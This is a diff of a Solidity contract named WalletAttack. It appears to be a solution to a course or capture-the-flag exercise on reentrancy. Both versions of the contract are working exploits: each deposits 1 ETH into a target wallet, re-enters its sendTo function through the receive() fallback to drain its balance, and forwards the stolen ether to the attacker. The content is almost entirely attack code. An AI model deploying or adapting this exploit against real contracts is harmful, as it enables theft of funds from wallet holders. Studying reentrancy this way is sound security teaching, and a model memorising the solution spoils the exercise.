@@ -1,51 +1,52 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.19;
 
-interface IWallet {
+interface WalletI {
+    // This is the interface of the wallet to be attacked.
     function deposit() external payable;
-    function sendTo(address payable destination) external;
+    function sendTo(address payable dest) external;
 }
 
 contract WalletAttack {
-    IWallet public wallet;
-    address public owner;
-    uint256 public constant ATTACK_AMOUNT = 1 ether;
-    uint256 public constant VICTIM_THRESHOLD = 3 ether;
+    // A contract used to attack the Vulnerable Wallet.
+    WalletI private target;
+    address private attacker;
+    uint256 private constant ATTACK_AMOUNT = 1 ether;
+    bool private attacking = false;
 
-    constructor(address _walletAddress) {
-        wallet = IWallet(_walletAddress);
-        owner = msg.sender;
+    constructor() {
+        // The constructor for the attacking contract.
+        // Do not change the signature
+        attacker = msg.sender;
     }
 
-    // Fallback function to enable attack
+    // Fallback function to enable the reentrancy attack
     receive() external payable {
-        // Try to drain more funds if possible
-        uint256 balance = address(wallet).balance;
-        if (balance > 0) {
-            wallet.sendTo(payable(address(this)));
+        if (attacking && address(target).balance > 0) {
+            target.sendTo(payable(address(this)));
         }
     }
 
-    // Function to initiate the attack
-    function attack() external payable {
-        // Ensure the victim wallet has at least the threshold amount
-        require(address(wallet).balance >= VICTIM_THRESHOLD, "Victim wallet does not have enough balance");
+    function exploit(WalletI _target) public payable {
+        // runs the exploit on the target wallet.
+        // you should not deposit more than 1 Ether to the vulnerable wallet.
+        // Assuming the target wallet has more than 3 Ether in deposits,
+        // you should withdraw at least 3 Ether from the wallet.
+        // The money taken should be sent back to the caller of this function
+        require(msg.value >= ATTACK_AMOUNT, "Need at least 1 ETH to perform attack");
+        require(address(_target).balance >= 3 ether, "Target must have at least 3 ETH");
         
-        // Deposit attack amount to the wallet
-        wallet.deposit{value: ATTACK_AMOUNT}();
+        target = _target;
         
-        // Initiate the first withdrawal
-        wallet.sendTo(payable(address(this)));
-    }
-
-    // Withdraw stolen funds
-    function withdraw() external {
-        require(msg.sender == owner, "Only owner can withdraw");
-        payable(owner).transfer(address(this).balance);
-    }
-
-    // Function to check contract balance
-    function getBalance() external view returns (uint256) {
-        return address(this).balance;
+        // Deposit 1 ETH to get access to the wallet
+        target.deposit{value: ATTACK_AMOUNT}();
+        
+        // Start the attack
+        attacking = true;
+        target.sendTo(payable(address(this)));
+        attacking = false;
+        
+        // Send all stolen funds back to the attacker
+        payable(msg.sender).transfer(address(this).balance);
     }
 }
